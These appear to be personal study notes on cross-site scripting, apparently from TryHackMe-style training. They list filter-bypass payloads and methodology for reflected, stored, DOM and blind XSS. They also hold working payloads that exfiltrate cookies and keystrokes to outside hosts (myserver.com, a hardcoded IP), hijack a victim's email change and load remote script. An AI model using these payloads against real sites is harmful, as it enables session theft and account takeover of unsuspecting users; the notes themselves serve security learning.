
Garrs favorite:
`"><img src=a onerror=alert(34)>`
![[Images/Pasted image 20240723202901.png]]
![[Images/Pasted image 20240723202943.png]]
How does it handle different characters. Is it stripping event handlers but keeping the img tag? Then you could try a simple script-alert-script payload.

---

`<script>alert("Succ3ssful XSS")</script>`
check where the text is reflected, in a tag?, in a string? end those:
`"><script>alert("Succ3ssful XSS")</script>`
in script code already?
`';alert('THM');//`

"script" word removed:
`<sscriptcript>alert('THM');</sscriptcript>`

<> filtered in IMG tag
`/images/cat.jpg" onload="alert('THM')`

Steal cookie - send to your own server to be logged
`<script>fetch('https://myserver.com/steal?cookie=' + btoa(document.cookie));</script>`
`</textarea><script>fetch('http://10.18.21.236:9001?cookie=' + btoa(document.cookie) );</script>`

Key logger - send to your own server to be logged
`<script>document.onkeypress = function(e) { fetch('https://myserver.com/log?key=' + btoa(e.key) );}</script>`

Using the web pages specific functions
`<script>user.changeEmail('attacker@hacker.thm');</script>`

"Polyglot"
``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``

**Reflected XSS** - our payload reflected/seen on the webpage/it's code
- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

![[24e50d95cecfc3783bd1a3a4fecbf310.png]]

**Stored XSS** - our payload is stored on the website (database...)
test every possible point of entry where it seems data is stored
- Comments on a blog
- User profile information
- Website Listings
Test by manually entering data for example instead of the pages drop down menu with numbers..

**DOM Based XSS** - JavaScript execution happens directly in the browser no new pages loaded or data submitted to backend. Execution occurs when the website JavaScript code acts on input or user interaction.
- look for parts of the code that access certain variables that an attacker can have control over, such as "**window.location.x**" parameters
When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as **eval()**

**Blind XSS** Stored but you can't see it
- Unfiltered messages sent
- ensure your payload has a call back (usually an HTTP request)




---

cross site scripting

insert javascript code into a website

stored or not, reflected or not



try html injection first - `"><u>test123"` /nahamsec

then try an event handler `<u/onmouseover=alert(1)>test123`
`<img src=x onerror=alert(1)>`

confirm

get your code in here `import('http://site.com/1.js')`

can put xss payload or blind xss payload

---

go through a web page, clicking everything to check what pages exist and what parameters exist, what fields exist..

#### Parameters
try payloads for parameters
url/?page_id=2test123 - is test123 on the page?
view page source or inspect, search for test123
	might end up in html, might be in html...
	if you're in a script tag, just close it: `"></script>test123`
	or for example `?param=2test123"></script>test123<img%20src=x%20onerror=alert();//>`
	or simply `?param=2%27;+alert()//test123`
	check for other empty variables in javascript code and try them as parameters

#### Fields
blog title: Welcome`"><U>test123`
colors for style
even if it is sanitized when entering into the form we can modify the request by capturing it with burp...
if we add a `</style>test123<script>alert()</script>`




